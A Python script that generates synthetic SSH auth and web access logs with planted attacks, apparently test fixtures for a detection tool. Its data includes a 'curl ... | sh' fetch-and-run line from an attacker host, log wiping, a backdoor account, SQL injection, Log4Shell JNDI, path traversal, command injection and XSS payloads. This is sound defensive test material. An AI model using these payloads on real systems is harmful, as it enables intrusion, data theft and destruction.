"""Generate realistic sample logs with known attacks planted in them.

The output is deterministic (fixed seed), so the test suite can assert that every planted
attack is detected and that benign background traffic is not flagged. All attacker addresses
are in 203.0.113.0/24 and all background clients in 198.51.100.0/24 / 192.0.2.0/24 — the
RFC 5737 documentation ranges, so no real hosts appear in the data.

    python scripts/generate_samples.py            # writes samples/auth.log and samples/access.log
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

DAY = datetime(2026, 3, 14)
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
OUT = Path(__file__).resolve().parent.parent / "samples"


class AuthLog:
    def __init__(self, rng: random.Random, host: str = "web01") -> None:
        self.rng, self.host, self.lines = rng, host, []

    def add(self, when: datetime, process: str, message: str, pid: int | None = None) -> None:
        stamp = f"{MONTHS[when.month - 1]} {when.day:>2} {when:%H:%M:%S}"
        pid_part = "" if process in ("sudo",) else f"[{pid or self.rng.randint(1000, 65000)}]"
        self.lines.append((when, f"{stamp} {self.host} {process}{pid_part}: {message}"))

    def port(self) -> int:
        return self.rng.randint(32768, 60999)

    def session(self, when: datetime, user: str, ip: str, method: str, uid: int) -> None:
        pid = self.rng.randint(1000, 65000)
        self.add(
            when, "sshd", f"Accepted {method} for {user} from {ip} port {self.port()} ssh2", pid
        )
        self.add(
            when,
            "sshd",
            f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)",
            pid,
        )
        end = when + timedelta(minutes=self.rng.randint(3, 90))
        self.add(end, "sshd", f"pam_unix(sshd:session): session closed for user {user}", pid)

    def failed(self, when: datetime, user: str, ip: str, invalid: bool = False) -> None:
        pid = self.rng.randint(1000, 65000)
        port = self.port()
        if invalid:
            self.add(when, "sshd", f"Invalid user {user} from {ip} port {port}", pid)
        prefix = "invalid user " if invalid else ""
        self.add(
            when, "sshd", f"Failed password for {prefix}{user} from {ip} port {port} ssh2", pid
        )

    def sudo(self, when: datetime, user: str, command: str, pwd: str = "/home") -> None:
        self.add(
            when,
            "sudo",
            f"   {user} : TTY=pts/0 ; PWD={pwd}/{user} ; USER=root ; COMMAND={command}",
        )

    def write(self, path: Path) -> None:
        self.lines.sort(key=lambda item: item[0])
        path.write_text("\n".join(line for _, line in self.lines) + "\n", encoding="utf-8")


def build_auth_log(rng: random.Random) -> AuthLog:
    log = AuthLog(rng)
    staff = {
        "alice": ("10.0.1.15", 1001),
        "bob": ("10.0.1.22", 1002),
        "carlos": ("10.0.1.37", 1003),
    }

    # --- background: cron, staff logins, CI deploys, routine sudo, internet noise -------------
    for minute in range(0, 24 * 60, 10):
        when = DAY + timedelta(minutes=minute, seconds=1)
        pid = rng.randint(1000, 65000)
        log.add(
            when,
            "CRON",
            "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
            pid,
        )
        log.add(
            when + timedelta(seconds=1),
            "CRON",
            "pam_unix(cron:session): session closed for user root",
            pid,
        )

    for user, (ip, uid) in staff.items():
        for _ in range(rng.randint(3, 6)):
            when = DAY + timedelta(hours=rng.uniform(8, 18))
            log.session(when, user, ip, "publickey", uid)

    for hour in range(24):
        when = DAY + timedelta(hours=hour, minutes=5, seconds=rng.randint(0, 50))
        log.session(when, "deploy", "10.0.5.10", "publickey", 1010)
        log.sudo(when + timedelta(seconds=20), "deploy", "/usr/bin/systemctl restart shopfront")

    log.sudo(DAY + timedelta(hours=9, minutes=12), "alice", "/usr/bin/apt update")
    log.sudo(
        DAY + timedelta(hours=9, minutes=14),
        "alice",
        "/usr/bin/tail -n 200 /var/log/nginx/error.log",
    )
    log.sudo(DAY + timedelta(hours=16, minutes=40), "carlos", "/usr/bin/systemctl status nginx")

    # bob mistypes his password twice, then gets in: must NOT be flagged as a compromise.
    morning = DAY + timedelta(hours=8, minutes=47)
    log.failed(morning, "bob", "10.0.1.22")
    log.failed(morning + timedelta(seconds=9), "bob", "10.0.1.22")
    log.session(morning + timedelta(seconds=20), "bob", "10.0.1.22", "password", 1002)
    # ...and fumbles sudo: three wrong passwords in one go (low severity finding).
    log.add(
        DAY + timedelta(hours=10, minutes=3),
        "sudo",
        "   bob : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; "
        "COMMAND=/usr/bin/systemctl restart nginx",
    )
    # An admin logs in directly as root (policy violation).
    log.session(DAY + timedelta(hours=11, minutes=30), "root", "10.0.1.15", "publickey", 0)

    noise_users = ["root", "admin", "ubuntu", "test", "user", "oracle", "pi"]
    for _ in range(40):
        ip = f"{rng.choice(['198.51.100', '192.0.2'])}.{rng.randint(2, 254)}"
        start = DAY + timedelta(minutes=rng.randint(0, 24 * 60 - 30))
        users = rng.sample(noise_users, rng.randint(1, 3))
        for n in range(rng.randint(1, 4)):
            user = users[n % len(users)]
            log.failed(
                start + timedelta(seconds=n * rng.randint(20, 300)),
                user,
                ip,
                invalid=user != "root",
            )

    # --- attack A: noisy root brute force (uses "message repeated" like real rsyslog) ---------
    t = DAY + timedelta(hours=2, minutes=13, seconds=7)
    for _ in range(20):
        log.failed(t, "root", "203.0.113.45")
        log.add(
            t + timedelta(seconds=2),
            "sshd",
            f"message repeated 2 times: [ Failed password for root from 203.0.113.45 port {log.port()} ssh2]",
        )
        t += timedelta(seconds=rng.randint(10, 22))

    # --- attack B: slow password spraying across many usernames -------------------------------
    sprayed = [
        "admin",
        "test",
        "guest",
        "oracle",
        "postgres",
        "ubuntu",
        "git",
        "jenkins",
        "ftpuser",
        "mysql",
        "support",
        "dev",
        "hadoop",
        "minecraft",
        "teamspeak",
        "nagios",
        "backup",
        "www",
        "tomcat",
        "ansible",
        "docker",
        "elastic",
        "steam",
        "user1",
        "root",
    ]
    t = DAY + timedelta(hours=4, minutes=2)
    for user in sprayed:
        log.failed(t, user, "203.0.113.23", invalid=user != "root")
        t += timedelta(seconds=rng.randint(150, 260))

    # --- attack C: brute force that SUCCEEDS, then privilege escalation and persistence --------
    t = DAY + timedelta(hours=13, minutes=37, seconds=12)
    for _ in range(38):
        log.failed(t, "deploy", "203.0.113.77")
        t += timedelta(seconds=rng.randint(4, 8))
    t += timedelta(seconds=30)
    log.session(t, "deploy", "203.0.113.77", "password", 1010)
    log.add(
        t + timedelta(minutes=2),
        "sudo",
        "   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    )
    log.add(t + timedelta(minutes=3), "useradd", "new group: name=sysbackup, GID=1005")
    log.add(
        t + timedelta(minutes=3, seconds=1),
        "useradd",
        "new user: name=sysbackup, UID=1005, GID=1005, home=/home/sysbackup, shell=/bin/bash, from=/dev/pts/1",
    )
    log.sudo(
        t + timedelta(minutes=4), "deploy", "/usr/bin/sh -c curl -s http://203.0.113.77/x.sh | sh"
    )
    log.sudo(t + timedelta(minutes=6), "deploy", "/usr/bin/truncate -s 0 /var/log/wtmp")
    return log


# ------------------------------------------------------------------------------------------
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36 Edg/129.0",
]
ASSETS = [("/static/css/main.css", 31_204), ("/static/js/app.js", 118_442), ("/favicon.ico", 4_286)]
PAGES = ["/", "/products", "/about", "/contact", "/cart", "/blog", "/blog/spring-sale"]


class AccessLog:
    def __init__(self, rng: random.Random) -> None:
        self.rng, self.lines = rng, []

    def add(
        self,
        when: datetime,
        ip: str,
        method: str,
        path: str,
        status: int,
        size: int,
        ua: str,
        referrer: str = "-",
    ) -> None:
        stamp = f"{when:%d}/{MONTHS[when.month - 1]}/{when:%Y:%H:%M:%S} +0000"
        line = f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "{referrer}" "{ua}"'
        self.lines.append((when, line))

    def write(self, path: Path) -> None:
        self.lines.sort(key=lambda item: item[0])
        path.write_text("\n".join(line for _, line in self.lines) + "\n", encoding="utf-8")


def build_access_log(rng: random.Random) -> AccessLog:
    log = AccessLog(rng)
    site = "https://shop.example.com"
    clients = [
        f"{rng.choice(['198.51.100', '192.0.2'])}.{n}" for n in rng.sample(range(2, 255), 150)
    ]

    # --- background browsing, weighted toward daytime ------------------------------------------
    for ip in clients:
        ua = rng.choice(BROWSERS)
        for _ in range(rng.randint(1, 3)):
            hour = min(23.9, max(0.0, rng.gauss(14, 4.5)))
            t = DAY + timedelta(hours=hour)
            for page_no in range(rng.randint(3, 12)):
                if rng.random() < 0.5:
                    page = f"/products/{rng.randint(1, 240)}"
                elif rng.random() < 0.3:
                    page = f"/api/products?page={rng.randint(1, 12)}&sort=price"
                else:
                    page = rng.choice(PAGES)
                status = 404 if rng.random() < 0.02 else 200
                log.add(t, ip, "GET", page, status, rng.randint(4_000, 22_000), ua, site + "/")
                if page_no == 0:
                    for asset, size in ASSETS:
                        cached = rng.random() < 0.4
                        log.add(
                            t + timedelta(milliseconds=300),
                            ip,
                            "GET",
                            asset,
                            304 if cached else 200,
                            0 if cached else size,
                            ua,
                            site + page,
                        )
                if rng.random() < 0.05:
                    t += timedelta(seconds=5)
                    log.add(
                        t,
                        ip,
                        "POST",
                        "/login",
                        302 if rng.random() < 0.85 else 401,
                        512,
                        ua,
                        site + "/login",
                    )
                t += timedelta(seconds=rng.randint(5, 120))

    # --- W1: directory brute force with gobuster; finds an exposed .env -----------------------
    words = [
        "admin",
        "backup",
        "old",
        "test",
        "dev",
        "api",
        "uploads",
        "images",
        "includes",
        "tmp",
        "wp-admin",
        "wp-login.php",
        "phpmyadmin",
        "server-status",
        ".git/HEAD",
        ".env",
        "config.php",
        "backup.zip",
        "db.sql",
        "cgi-bin/",
        "login",
        "portal",
        "console",
    ]
    words += [
        f"{w}{n}" for w in ("admin", "test", "dev", "bak", "files", "data") for n in range(1, 70)
    ]
    t = DAY + timedelta(hours=1, minutes=5)
    for word in words:
        status, size = 404, 153
        if word in (".git/HEAD", "server-status", "phpmyadmin"):
            status, size = 403, 199
        elif word == ".env":
            status, size = 200, 1_047
        elif word in ("admin", "login"):
            status, size = 302, 0
        log.add(t, "203.0.113.10", "GET", f"/{word}", status, size, "gobuster/3.6")
        t += timedelta(milliseconds=rng.randint(250, 550))

    # --- W2: sqlmap against the product endpoint ------------------------------------------------
    payloads = [
        "1' AND 1=1-- -",
        "1' AND 1=2-- -",
        "1 UNION ALL SELECT NULL,NULL,NULL-- -",
        "1' AND SLEEP(5)-- -",
        "1) AND (SELECT 7365 FROM (SELECT(SLEEP(5)))abc)",
        "1' OR '1'='1",
        "1 AND 8312=8312",
        "1'; DROP TABLE users-- -",
        "1 UNION SELECT username,password FROM users-- -",
        "1' AND extractvalue(1,concat(0x7e,version()))-- -",
    ]
    t = DAY + timedelta(hours=3, minutes=20)
    for i in range(120):
        payload = payloads[i % len(payloads)]
        status = 500 if "SLEEP" in payload or "DROP" in payload else 200
        log.add(
            t,
            "203.0.113.66",
            "GET",
            f"/products?id={quote(payload)}",
            status,
            rng.randint(400, 9_000),
            "sqlmap/1.8.4#stable (https://sqlmap.org)",
        )
        t += timedelta(seconds=rng.uniform(1, 4))

    # --- W3: credential stuffing against the login form ---------------------------------------
    t = DAY + timedelta(hours=9, minutes=10)
    for i in range(180):
        status = 302 if i in (171, 177) else 401
        log.add(
            t,
            "203.0.113.99",
            "POST",
            "/login",
            status,
            512,
            "python-requests/2.32.3",
            site + "/login",
        )
        t += timedelta(seconds=rng.uniform(2, 6))

    # --- W4: Log4Shell, path traversal and command injection probes ----------------------------
    t = DAY + timedelta(hours=11, minutes=47)
    probes = [
        ("GET", "/", 200, "${jndi:ldap://203.0.113.150:1389/Exploit}"),
        ("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", 400, "curl/8.5.0"),
        ("GET", "/static/../../../../etc/passwd", 404, "curl/8.5.0"),
        ("GET", "/download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow", 404, "curl/8.5.0"),
        ("GET", "/api/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd", 400, "curl/8.5.0"),
        ("GET", "/api/ping?host=%60id%60", 400, "curl/8.5.0"),
    ]
    for method, path, status, ua in probes:
        log.add(t, "203.0.113.150", method, path, status, 180, ua)
        t += timedelta(seconds=rng.randint(3, 12))

    # --- W5: reflected XSS probing ---------------------------------------------------------------
    t = DAY + timedelta(hours=15, minutes=2)
    for payload in [
        "<script>alert(document.cookie)</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ]:
        log.add(t, "203.0.113.75", "GET", f"/search?q={quote(payload)}", 200, 6_210, BROWSERS[2])
        t += timedelta(seconds=rng.randint(20, 60))

    # --- W6: quiet bulk export — no rule fires; the Isolation Forest should surface it ----------
    for i in range(25):
        t = DAY + timedelta(hours=20, minutes=i * 8, seconds=rng.randint(0, 59))
        log.add(
            t,
            "203.0.113.200",
            "GET",
            "/api/v1/export?table=customers&format=csv",
            200,
            rng.randint(40_000_000, 60_000_000),
            BROWSERS[0],
            site + "/admin/reports",
        )

    # --- W7: request flood ----------------------------------------------------------------------
    t = DAY + timedelta(hours=18, minutes=30)
    for _ in range(1_600):
        log.add(t, "203.0.113.180", "GET", "/", 200, 14_820, "Mozilla/5.0")
        t += timedelta(milliseconds=rng.randint(80, 160))
    return log


def main() -> None:
    OUT.mkdir(exist_ok=True)
    rng = random.Random(1337)
    build_auth_log(rng).write(OUT / "auth.log")
    build_access_log(rng).write(OUT / "access.log")
    for name in ("auth.log", "access.log"):
        lines = (OUT / name).read_text(encoding="utf-8").count("\n")
        print(f"wrote {OUT / name} ({lines:,} lines)")


if __name__ == "__main__":
    main()
